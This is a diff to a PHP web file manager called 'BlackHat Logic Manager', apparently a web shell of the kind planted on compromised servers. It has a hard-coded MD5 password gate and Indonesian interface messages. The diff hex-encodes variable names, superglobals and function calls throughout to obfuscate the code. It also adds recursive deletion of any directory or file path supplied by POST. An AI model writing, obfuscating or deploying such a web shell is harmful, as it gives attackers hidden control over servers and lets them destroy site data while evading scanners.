@@ -4,35 +4,28 @@ session_start();
 $APP_NAME = "BlackHat Logic Manager";
 $BASE_PATH = getcwd();
 
-
-$PASSWORD_MD5 = "a84e5f25e7f6d5de9b82ce3f64d1b8fa";
-
-
-if(isset($_POST['login'])){
-    $pass = $_POST['password'];
-    if(md5($pass) === $PASSWORD_MD5){
-        $_SESSION['logged_in'] = true;
-        header("Location: ".$_SERVER['PHP_SELF']);
+${"\x50\x41\x53\x53\x57\x4f\x52\x44\x5f\x4d\x44\x35"} = "\x61\x38\x34\x65\x35\x66\x32\x35\x65\x37\x66\x36\x64\x35\x64\x65\x39\x62\x38\x32\x63\x65\x33\x66\x36\x34\x64\x31\x62\x38\x66\x61";
+if(isset(${"\x5f\x50\x4f\x53\x54"}["\x6c\x6f\x67\x69\x6e"])){
+    ${"\x70\x61\x73\x73"} = ${"\x5f\x50\x4f\x53\x54"}["\x70\x61\x73\x73\x77\x6f\x72\x64"];
+    if(md5(${"\x70\x61\x73\x73"}) === ${"\x50\x41\x53\x53\x57\x4f\x52\x44\x5f\x4d\x44\x35"}){
+        ${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] = true;
+        header("Location: ".${"\x5f\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5f\x53\x45\x4c\x46"]);
         exit;
     } else {
-        $msg = "Password salah!";
+        ${"\x6d\x73\x67"} = "\x50\x61\x73\x73\x77\x6f\x72\x64\x20\x73\x61\x6c\x61\x68\x21";
     }
 }
-
-
-if(isset($_GET['logout'])){
+if(isset(${"\x5f\x47\x45\x54"}["\x6c\x6f\x67\x6f\x75\x74"])){
     session_destroy();
-    header("Location: ".$_SERVER['PHP_SELF']);
+    header("Location: ".${"\x5f\x53\x45\x52\x56\x45\x52"}["\x50\x48\x50\x5f\x53\x45\x4c\x46"]);
     exit;
 }
-
-
-if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
+if(!isset(${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"]) || ${"\x5f\x53\x45\x53\x53\x49\x4f\x4e"}["\x6c\x6f\x67\x67\x65\x64\x5f\x69\x6e"] !== true){
     ?>
     <!DOCTYPE html>
     <html>
     <head>
-        <title><?=$APP_NAME?> - Login</title>
+        <title><?=${"\x41\x50\x50\x5f\x4e\x41\x4d\x45"}?> - Login</title>
         <style>
             body{background:#0d0d0d;color:#eee;font-family:monospace;text-align:center;padding-top:100px;}
             input{padding:6px;margin:5px;border-radius:4px;border:none;}
@@ -42,19 +35,17 @@ if(!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true){
         </style>
     </head>
     <body>
-        <h1><?=$APP_NAME?></h1>
+        <h1><?=${"\x41\x50\x50\x5f\x4e\x41\x4d\x45"}?></h1>
         <form method="POST">
             Password: <input type="password" name="password"><br>
             <input type="submit" name="login" value="Login">
         </form>
-        <?php if(isset($msg)) echo "<div class='msg'>$msg</div>"; ?>
+        <?php if(isset(${"\x6d\x73\x67"})) echo "<div class='msg'>".${"\x6d\x73\x67"}."</div>"; ?>
     </body>
     </html>
     <?php
     exit;
 }
-
-
 
 function perms($file){ return substr(sprintf('%o', fileperms($file)), -4); }
 function owner($file){
@@ -144,9 +135,27 @@ if(isset($_POST["\x6e\x65\x77\x66\x6f\x6c\x64\x65\x72"])){
         $msgType = "\x65\x72\x72\x6f\x72";
     }
 }
+
 if(isset($_POST["\x64\x65\x6c\x65\x74\x65"])){
     $t=$_POST["\x74\x61\x72\x67\x65\x74"];
-    if("\x69\x73\x5f\x64\x69\x72"($t)?@rmdir($t):@unlink($t)){
+    $deleted = false;
+    if("\x69\x73\x5f\x64\x69\x72"($t)){
+        // Fungsi untuk hapus folder beserta isinya secara rekursif
+        function deleteDirectory($dir) {
+            if(!@file_exists($dir)) return true;
+            if(!@is_dir($dir)) return @unlink($dir);
+            foreach(@scandir($dir) as $item) {
+                if($item == '.' || $item == '..') continue;
+                if(!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) return false;
+            }
+            return @rmdir($dir);
+        }
+        $deleted = deleteDirectory($t);
+    } else {
+        $deleted = @unlink($t);
+    }
+    
+    if($deleted){
         $msg = "\x44\x69\x68\x61\x70\x75\x73\x3a\x20"."\x62\x61\x73\x65\x6e\x61\x6d\x65"($t);
         $msgType = "\x73\x75\x63\x63\x65\x73\x73";
     } else {
